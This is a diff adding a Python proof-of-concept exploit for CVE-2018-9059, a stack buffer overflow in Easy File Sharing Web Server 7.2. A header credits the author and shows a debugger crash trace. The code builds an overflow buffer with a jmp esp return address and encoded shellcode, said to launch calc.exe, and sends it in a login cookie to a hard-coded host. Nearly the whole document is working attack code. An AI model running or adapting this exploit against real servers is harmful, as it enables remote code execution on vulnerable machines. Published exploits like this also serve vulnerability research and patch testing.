@@ -1,0 +1,67 @@
+# Exploit Title: Easy File Sharing Web Server 7.2 stack buffer overflow
+# Date: 03/24/2018
+# Exploit Author: rebeyond - http://www.rebeyond.net
+# Vendor Homepage: http://www.sharing-file.com/
+# Software Link: http://www.sharing-file.com/efssetup.exe
+# Version: 7.2
+# CVE: CVE-2018-9059
+# Tested on: Windows XP Professional SP3
+#
+# Description:
+# Attackers just need to construct a malicious login request packet,and send the packet to the server.The server can be pwned
+#
+#
+# The stack trace is as follows:
+# (40d8.2980): Access violation - code c0000005 (first chance)
+# r
+# eax=41414141 ebx=00000001 ecx=ffffffff edx=08fb62a0 esi=08fb6280 edi=08fb62a0
+# eip=61c277f6 esp=08fb61fc ebp=08fb6214 iopl=0         nv up ei pl nz na pe nc
+# cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
+# *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\EFS Software\Easy File Sharing Web Server\sqlite3.dll -
+# sqlite3!sqlite3_errcode+0x8e:
+# 61c277f6 81784c97a629a0  cmp     dword ptr [eax+4Ch],0A029A697h ds:002b:4141418d=????????
+#
+# kb
+# ChildEBP RetAddr  Args to Child
+# WARNING: Stack unwind information not available. Following frames may be wrong.
+# 083b6214 61c6286c 00001183 0000115d 085c4d44 sqlite3!sqlite3_errcode+0x8e
+# *** WARNING: Unable to verify checksum for fsws.exe
+# *** ERROR: Module load completed but symbols could not be loaded for fsws.exe
+# 083b6254 004968f4 00000001 00000000 083b6280 sqlite3!sqlite3_declare_vtab+0x3282
+# 083b6274 004975a3 083b6298 00000000 083b75fc fsws+0x968f4
+# 00000000 00000000 00000000 00000000 00000000 fsws+0x975a3
+
+
+import requests
+host='192.168.50.30'
+port='80'
+
+buf='A'*4071
+buf +='\x12\x45\xfa\x7f' #jmp esp
+buf +='A'*12
+buf +='\xeb\x36'  #jmp 0x36
+buf +='A'*42
+buf +='\x60\x30\xc7\x61'*2 #must be valid address
+buf +='A'*4
+#shellcode to execute calc.exe on remote server
+buf += "\xdb\xdc\xd9\x74\x24\xf4\x58\xbb\x24\xa7\x26\xec\x33"
+buf += "\xc9\xb1\x31\x31\x58\x18\x03\x58\x18\x83\xe8\xd8\x45"
+buf += "\xd3\x10\xc8\x08\x1c\xe9\x08\x6d\x94\x0c\x39\xad\xc2"
+buf += "\x45\x69\x1d\x80\x08\x85\xd6\xc4\xb8\x1e\x9a\xc0\xcf"
+buf += "\x97\x11\x37\xe1\x28\x09\x0b\x60\xaa\x50\x58\x42\x93"
+buf += "\x9a\xad\x83\xd4\xc7\x5c\xd1\x8d\x8c\xf3\xc6\xba\xd9"
+buf += "\xcf\x6d\xf0\xcc\x57\x91\x40\xee\x76\x04\xdb\xa9\x58"
+buf += "\xa6\x08\xc2\xd0\xb0\x4d\xef\xab\x4b\xa5\x9b\x2d\x9a"
+buf += "\xf4\x64\x81\xe3\x39\x97\xdb\x24\xfd\x48\xae\x5c\xfe"
+buf += "\xf5\xa9\x9a\x7d\x22\x3f\x39\x25\xa1\xe7\xe5\xd4\x66"
+buf += "\x71\x6d\xda\xc3\xf5\x29\xfe\xd2\xda\x41\xfa\x5f\xdd"
+buf += "\x85\x8b\x24\xfa\x01\xd0\xff\x63\x13\xbc\xae\x9c\x43"
+buf += "\x1f\x0e\x39\x0f\x8d\x5b\x30\x52\xdb\x9a\xc6\xe8\xa9"
+buf += "\x9d\xd8\xf2\x9d\xf5\xe9\x79\x72\x81\xf5\xab\x37\x7d"
+buf += "\xbc\xf6\x11\x16\x19\x63\x20\x7b\x9a\x59\x66\x82\x19"
+buf += "\x68\x16\x71\x01\x19\x13\x3d\x85\xf1\x69\x2e\x60\xf6"
+buf += "\xde\x4f\xa1\x95\x81\xc3\x29\x74\x24\x64\xcb\x88"
+
+cookies = dict(SESSIONID='6771', UserID=buf,PassWD='')
+data=dict(frmLogin='',frmUserName='',frmUserPass='',login='')
+requests.post('http://'+host+':'+port+'/forum.ghp',cookies=cookies,data=data)
